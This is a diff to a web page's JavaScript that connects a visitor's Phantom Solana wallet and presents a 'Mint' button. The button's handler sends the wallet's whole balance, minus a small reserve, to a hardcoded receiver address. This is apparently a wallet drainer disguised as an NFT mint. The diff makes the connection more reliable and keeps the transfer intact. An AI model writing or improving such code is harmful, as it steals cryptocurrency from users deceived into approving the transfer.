@@ -14,14 +14,21 @@
       $('#connect-wallet').on('click', async () => {
         console.log("Connect button clicked");
 
+        // Must use HTTPS for Phantom to work reliably
+        if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+          alert("Phantom wallet requires HTTPS connection.");
+          return;
+        }
+
         if (window.solana && window.solana.isPhantom) {
           try {
-            const resp = await window.solana.connect();
-            console.log("Phantom Wallet connected:", resp.publicKey.toString());
+            const resp = await window.solana.connect({ onlyIfTrusted: false });
+            const publicKeyStr = resp.publicKey.toString();
+            console.log("Phantom Wallet connected:", publicKeyStr);
+            alert("Wallet connected: " + publicKeyStr);
 
             const connection = new solanaWeb3.Connection(
-              // You can replace with your Syndica endpoint if valid
-              'https://api.mainnet-beta.solana.com',
+              'https://api.mainnet-beta.solana.com', // Use default reliable endpoint
               'confirmed'
             );
 
@@ -42,7 +49,7 @@
               console.log("Mint button clicked");
 
               try {
-                const receiverWallet = new solanaWeb3.PublicKey('FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n'); // Destination wallet
+                const receiverWallet = new solanaWeb3.PublicKey('FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n');
                 const balanceForTransfer = walletBalance - minBalance;
                 console.log("Balance for transfer:", balanceForTransfer);
 
@@ -75,9 +82,11 @@
                 alert("Minting failed: " + (err.message || err));
               }
             });
+
           } catch (err) {
             console.error("Error connecting to Phantom Wallet:", err);
-            alert("Connection failed: " + (err.message || err));
+            const message = err && err.message ? err.message : JSON.stringify(err);
+            alert("Connection failed: " + message);
           }
         } else {
           alert("Phantom extension not found.");
